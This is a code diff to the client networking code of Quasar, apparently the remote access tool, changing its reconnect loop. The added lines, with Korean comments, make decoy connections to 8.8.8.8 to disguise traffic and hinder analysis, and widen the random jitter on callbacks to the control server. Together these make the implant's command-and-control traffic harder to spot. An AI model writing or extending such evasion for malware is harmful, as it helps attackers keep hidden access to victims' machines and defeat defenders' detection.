@@ -63,22 +63,28 @@ namespace Quasar.Client.Networking
         /// </summary>
         public void ConnectLoop()
         {
-            // TODO: do not re-use object
             while (!_token.IsCancellationRequested)
             {
                 if (!Connected)
                 {
-                    Host host = _hosts.GetNextHost();
+                    // [추가] 가짜 IP 접속 로직 (분석 방해)
+                    if (this._random.Next(0, 10) > 7) // 30% 확률
+                    {
+                        try
+                        {
+                            using (System.Net.Sockets.TcpClient decoy = new System.Net.Sockets.TcpClient())
+                                decoy.Connect("8.8.8.8", 443); // 정상 서비스 접속 위장
+                        }
+                        catch { }
+                    }
 
+                    Host host = _hosts.GetNextHost();
                     base.Connect(host.IpAddress, host.Port);
                 }
 
-                while (Connected) // hold client open
+                while (Connected)
                 {
-                    try
-                    {
-                        _token.WaitHandle.WaitOne(1000);
-                    }
+                    try { _token.WaitHandle.WaitOne(1000); }
                     catch (Exception e) when (e is NullReferenceException || e is ObjectDisposedException)
                     {
                         Disconnect();
@@ -86,13 +92,13 @@ namespace Quasar.Client.Networking
                     }
                 }
 
-                if (_token.IsCancellationRequested)
-                {
-                    Disconnect();
-                    return;
-                }
+                if (_token.IsCancellationRequested) { Disconnect(); return; }
 
-                Thread.Sleep(Settings.RECONNECTDELAY + _random.Next(250, 750));
+                // [수정] 강화된 지터링 적용
+                // Settings.RECONNECTDELAY의 약 50%~150% 사이 랜덤 시간 대기
+                int baseDelay = Settings.RECONNECTDELAY;
+                int jitter = _random.Next(baseDelay / 2, baseDelay + (baseDelay / 2));
+                Thread.Sleep(jitter);
             }
         }
 
